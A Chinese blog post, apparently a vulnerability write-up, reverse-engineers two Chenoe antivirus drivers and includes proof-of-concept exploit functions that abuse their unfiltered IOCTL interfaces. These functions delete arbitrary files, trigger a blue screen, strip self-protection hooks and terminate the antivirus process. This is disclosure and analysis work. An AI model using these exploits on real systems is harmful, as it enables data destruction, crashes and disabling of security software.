
# 奇诺反病毒软件的几个漏洞

> 原文：[`www.pediy.com/kssd/pediy11/119865.html`](https://www.pediy.com/kssd/pediy11/119865.html)

今天安装奇诺反病毒软件看了看，漏洞挺多的。

奇诺安装好后，会在安装目录下释放两个驱动：`KillFile.sys` 和 `chenoepro.sys`，一个是用来强行杀文件的（通过自己发 `IRP` 实现），一个是用来自我保护的（通过 `inline hook NtOpenProcess` 实现）。

先看看 `KillFile.sys` 驱动，该驱动的 `IRP_MJ_CREATE` 和 `IRP_MJ_CLOSE` 派遣例程如下：

```
push  ebp
mov  ebp, esp
mov  eax, [ebp+Irp]
mov  dword ptr [eax+18h], 0
xor  dl, dl    ; PriorityBoost
mov  ecx, [ebp+Irp]  ; Irp
call  ds:IofCompleteRequest
xor  eax, eax
pop  ebp
retn  8
```

很简单的直接返回成功，没有对打开该设备的进程做任何过滤！再看看 `IRP_MJ_DEVICE_CONTROL` 的派遣例程，逆向如下：

```
NTSTATUS MyDeviceIoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
  HANDLE hFile;
  ULONG code = irpsp->Parameters.DeviceIoControl.IoControlCode;
  PWSTR *ppwcsFileName =  (PCWSTR *)Irp->AssociatedIrp.SystemBuffer;
  if ( code == 0x220D80 ) {
    // 可以看出，DeviceIoControl 的 lpInBuffer 是个指向文件名缓冲区地址的指针……
    // 汗，竟然敢这么做……
    hFile = MyCreateFile(*ppwcsFileName, FILE_READ_ATTRIBUTES, FILE_SHARE_DELETE);
    if ( hFile ) {
      MyDeleteFile(hFile);  //通过发 IRP 实现
      ZwClose(hFile);
      DbgPrint("succeed!\n");
    }
  }

  // 无论如何都返回失败，所以不用判断 DeviceIoControl 的返回值了
  Irp->IoStatus.Information = 0;
  Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
  IofCompleteRequest(Irp, 0);
  return STATUS_INVALID_DEVICE_REQUEST;
}
```

因此，该 `KillFile.sys` 驱动不仅可以作为删文件后门使用，还能用来蓝屏……。

漏洞利用代码如下：

```
// by Fypher
int xxxKillFile(int usage) {
  HANDLE hDevice;
  DWORD dwRet;

  // chenoe 的 KillFile.sys 驱动没有对打开 SuperKillFile 设备的进程进行过滤！
  hDevice = CreateFile("\\\\.\SuperKillFile", 0, 0,
    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,  NULL);
  if (hDevice == INVALID_HANDLE_VALUE)
    return 0;

  if (usage == 1) {
    // 漏洞利用 1：删文件后门。
    PWSTR pwcsFileName = L"\\??\\C:\\test.txt";
    DeviceIoControl(hDevice, 0x220D80, &pwcsFileName, sizeof(pwcsFileName), NULL, 0, &dwRet,
NULL);
    CloseHandle(hDevice);
    return 1;
  } else if (usage == 2) {
    // 漏洞利用 2：Blue Screen. ^_^
    DeviceIoControl(hDevice, 0x220D80, NULL, 0, NULL, 0, &dwRet, NULL);
    CloseHandle(hDevice);
    return 2;
  } else {
    CloseHandle(hDevice);
    return 0;
  }
}
```

接下来看看 `chenoepro.sys`，同样的问题，没有对打开设备的进程进行过滤。另外，`chenoepro.sys` 驱动是通过 `DeviceIoControl` 来接受命令进行挂钩和摘钩的（`ioctl code` 是 `0x220004` 为挂钩，`0x220008` 为摘钩）。因此我们可以随便摘掉它的钩子。

我们再看看它的 `FakeNtOpenProcess` 函数，逆向如下：

```
NTSTATUS FakeNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId)
{
  NTSTATUS status;
  PEPROCESS eproc;

  PsLookupProcessByProcessId(ClientId->UniqueProcess, &eproc);
  // 如果不等于本进程，就允许打开。
  if ( g_Eprocess != eproc )
    status = RealNtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
  // 否则返回个“随机数”，都不初始化一下……汗
  return status;

}
```

很简单的阻止进程对象为 `g_Eprocess` 的进程被打开。而 `g_Eprocess` 其实是在挂钩的时候被赋值为当前进程！

```
call  ds:IoGetCurrentProcess
mov  g_Eproc, eax  // g_Eproc 为当前进程
call  KeGetCurrentThread
mov  g_Ethread, eax
call  sub_10490  // 挂钩 NtOpenProcess，在该函数里会将 g_Eprocess 赋值为 g_Eproc！
```

所以我们不仅可以随便摘这个驱动的钩子，还可以利用这个驱动来保护自己。^_^

漏洞利用代码如下：

```
// by Fypher
int xxxChenoepro_SYS(DWORD pid) {
  HANDLE hDevice;
  DWORD dwRet;

  hDevice = CreateFile("\\\\.\chenoepro", 0, 0,
    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,  NULL);
  if (hDevice == INVALID_HANDLE_VALUE)
    return 0;

  // 摘掉 NtOpenProcess 的钩子
  DeviceIoControl(hDevice, 0x220008, NULL, 0, NULL, 0, &dwRet, NULL);
  // 恢复 NtOpenProcess 的钩子，借别人的力量保护自己吧！^_^
  DeviceIoControl(hDevice, 0x220004, NULL, 0, NULL, 0, &dwRet, NULL);
  
  // 并且我们现在可以轻松关掉掉奇诺反病毒软件了：
  if (pid) {
    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProc) {
      TerminateProcess(hProc, 0);
      CloseHandle(hProc);
    }
  }
  return 1;
}
```
